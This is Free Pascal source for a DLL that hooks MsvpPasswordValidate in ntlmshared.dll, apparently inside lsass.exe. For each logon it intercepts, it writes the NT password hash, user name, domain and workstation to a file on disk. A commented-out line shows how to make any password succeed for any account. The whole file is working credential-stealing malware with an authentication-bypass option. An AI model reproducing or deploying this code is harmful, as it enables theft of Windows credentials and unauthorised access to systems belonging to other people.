library hook;
{$mode delphi}

uses windows,DDetours,sysutils  ;

type _NETLOGON_LOGON_INFO_CLASS =(
  NetlogonInteractiveInformation = 1,NetlogonNetworkInformation,
  NetlogonServiceInformation,NetlogonGenericInformation,
  NetlogonInteractiveTransitiveInformation,NetlogonNetworkTransitiveInformation,
  NetlogonServiceTransitiveInformation);


type tbyte16=array[0..15] of byte;

 type
UNICODE_STRING = record
  Length: USHORT;
  MaximumLength: USHORT;
  {$ifdef CPU64}dummy:dword;{$endif cpu64}
  Buffer: PWIDECHAR;
end;

type _OLD_LARGE_INTEGER =record
    LowPart:ulong;
    HighPart:long;
   end;
 OLD_LARGE_INTEGER=_OLD_LARGE_INTEGER;

 //https://docs.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-netlogon_logon_identity_info
   type _NETLOGON_LOGON_IDENTITY_INFO =record
         LogonDomainName:UNICODE_STRING;
         ParameterControl:ULONG;
         LogonId:OLD_LARGE_INTEGER;
         UserName:UNICODE_STRING;
         Workstation:UNICODE_STRING;
   end;
   PNETLOGON_LOGON_IDENTITY_INFO=^_NETLOGON_LOGON_IDENTITY_INFO;

type _SAMPR_USER_INTERNAL1_INFORMATION =record
   EncryptedNtOwfPassword:tbyte16;
   EncryptedLmOwfPassword:tbyte16;
   NtPasswordPresent:byte;
   LmPasswordPresent:byte;
   PasswordExpired:byte;
   end;
 SAMPR_USER_INTERNAL1_INFORMATION=_SAMPR_USER_INTERNAL1_INFORMATION;
 PSAMPR_USER_INTERNAL1_INFORMATION=^SAMPR_USER_INTERNAL1_INFORMATION;

type TMsvpPasswordValidate=function(UasCompatibilityRequired:pointer;
     logontype:word;
     LogonInformation:pointer;
     Passwords:pointer;
     UserFlags:pointer;
     UserSessionKey:pointer;
     LmSessionKey:pointer): dword;stdcall;

  var
  Trampoline: TMsvpPasswordValidate = nil;

Const
{ DllEntryPoint }
DLL_PROCESS_ATTACH = 1;
DLL_THREAD_ATTACH = 2;
DLL_PROCESS_DETACH = 0;
DLL_THREAD_DETACH = 3;

{
The GetModuleHandle function returns a handle to a mapped module without incrementing its reference count.
However, if this handle is passed to the FreeLibrary function,
the reference count of the mapped module will be decremented.
Therefore, do not pass a handle returned by GetModuleHandle to the FreeLibrary function.
Doing so can cause a DLL module to be unmapped prematurely.
}

procedure log(s:ansistring;l:ushort=0);
var
   	 hFile:HANDLE;
	 dwWritten:DWORD;
        l_:ushort;
begin

	hFile := CreateFile('C:\log.txt',
		GENERIC_WRITE,
		0,
		nil,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0);

	if (hFile <> INVALID_HANDLE_VALUE) then
	begin
		SetFilePointer(hFile, 0, nil, FILE_END);
               if l>0 then l_:=l else l_:=length(s);
               WriteFile(hfile,s[1],l_,dwWritten,nil);
		CloseHandle(hFile);
	end;
end;

function ByteToHexaString(hash:array of byte):string;
var
  i:word;
  dummy:string='';
begin
//log('**** ByteToHexaString ****');
//log('sizeof:'+inttostr(sizeof(hash)));
try
  for i:=0 to sizeof(hash)-1 do  dummy:=dummy+inttohex(hash[i],2);
  result:=dummy;
except
on e:exception do log('ByteToHexaString:'+e.Message );
end;
end;

//LogonInformation
//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d0128545-f74b-4d89-afd9-42621dff24c4
{
BOOLEAN
MsvpPasswordValidate (
    IN BOOLEAN UasCompatibilityRequired,
    IN NETLOGON_LOGON_INFO_CLASS LogonLevel,
    IN PVOID LogonInformation,
    IN PUSER_INTERNAL1_INFORMATION Passwords,
    OUT PULONG UserFlags,
    OUT PUSER_SESSION_KEY UserSessionKey,
    OUT PLM_SESSION_KEY LmSessionKey
)
}

function myMsvpPasswordValidate(UasCompatibilityRequired:pointer;
     logontype:word;
     LogonInformation:pointer;
     Passwords:pointer;
     UserFlags:pointer;
     UserSessionKey:pointer;
     LmSessionKey:pointer): dword;stdcall;
begin
OutputDebugString('MsvpPasswordValidate');
log('****************'+#13#10);
log('LogonLevel:'+inttostr(logontype)+#13#10);
log('EncryptedNtOwfPassword:'+ByteToHexaString(PSAMPR_USER_INTERNAL1_INFORMATION(passwords)^.EncryptedNtOwfPassword)+#13#10) ;
log('LogonDomainName:');
log(ansistring(strpas(PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.LogonDomainName.Buffer)),PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.LogonDomainName.Length  div 2) ;
log(#13#10);
//seems provided clear text password is right after the pointer for username...
log('UserName:');
log(ansistring(strpas(PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.UserName.Buffer)),PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.UserName.Length  div 2 ) ;
log(#13#10);
log('Workstation:');
log(ansistring(strpas(PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.Workstation.Buffer)),PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.Workstation.Length div 2) ;
log(#13#10);
Result := Trampoline(UasCompatibilityRequired,logontype,LogonInformation,Passwords,UserFlags,UserSessionKey,LmSessionKey );
//result:=1; //this will validate any password and any account (local & remote)
end;

function attach(param:pointer):dword;
begin
OutputDebugString('attach');
log ('attach'#13#10);
@Trampoline := InterceptCreate('ntlmshared.dll','MsvpPasswordValidate', @myMsvpPasswordValidate, nil);
//the below effectively unloads the dll but crashes lsass.exe
//FreeLibraryAndExitThread(GetModuleHandle('hook.dll'), 0);
sleep(1000);
ExitThread(0);
end;

procedure detach;
begin
OutputDebugString('detach');
log ('detach'#13#10);
  if Assigned(Trampoline) then
    begin
      InterceptRemove(@Trampoline);
      Trampoline := nil;
      log ('trampoline removed'#13#10);
    end;
end;

exports attach;

procedure DLLEntryPoint(dwReason: DWord);
var tid:dword;
  hthread:thandle;
begin
  case dwReason of
    DLL_PROCESS_ATTACH:
      begin
        //DisableThreadLibraryCalls ?
        OutputDebugString ('DLL_PROCESS_ATTACH') ;
        hthread:=CreateThread (nil,$ffff,@attach,nil,0,tid);
        //dummy(nil);
        WaitForInputIdle (hthread,INFINITE);
        closehandle(hthread );
        //exitthread(0);
        //FreeLibrary(GetModuleHandle(nil));
        exit;
      end;
    DLL_PROCESS_DETACH:
      begin
        OutputDebugString ('DLL_PROCESS_DETACH') ;
        detach;
      end;
    DLL_THREAD_ATTACH:  OutputDebugString ('DLL_THREAD_ATTACH') ;
    DLL_THREAD_DETACH:  OutputDebugString ('DLL_THREAD_DETACH') ;
  end;
end;

procedure DLLTHREADATTACH(dllparam: longint);
begin
DLLEntryPoint(DLL_THREAD_ATTACH);
end;

procedure DLLTHREADDETACH(dllparam: longint);
begin
DLLEntryPoint(DLL_THREAD_DETACH);
end;

procedure DLLPROCESSDETACH(dllparam: longint);
begin
DLLEntryPoint(DLL_PROCESS_DETACH);
end;


begin
OutputDebugString('BEGIN');
log ('BEGIN'#13#10);
{$ifdef fpc}
Dll_Thread_Attach_Hook := @DLLTHREADATTACH;
Dll_Thread_Detach_Hook := @DLLTHREADDETACH;
Dll_Process_Detach_Hook := @DLLPROCESSDETACH;
{$else }
  DLLProc:= @DLLEntryPoint;
{$endif}
DLLEntryPoint(DLL_PROCESS_ATTACH);
end.


 
